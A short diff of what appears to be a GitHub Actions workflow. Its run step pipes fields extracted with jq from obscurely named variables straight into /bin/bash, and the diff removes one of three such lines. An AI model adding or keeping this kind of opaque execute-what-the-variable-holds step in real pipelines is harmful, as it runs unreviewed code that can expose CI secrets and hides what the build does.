@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$bm7678" | jq -r .g22 | /bin/bash
           echo $vo77319 | jq -r .jf50 | /bin/bash
-          echo $kyei50 | jq -r .ujd11904 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
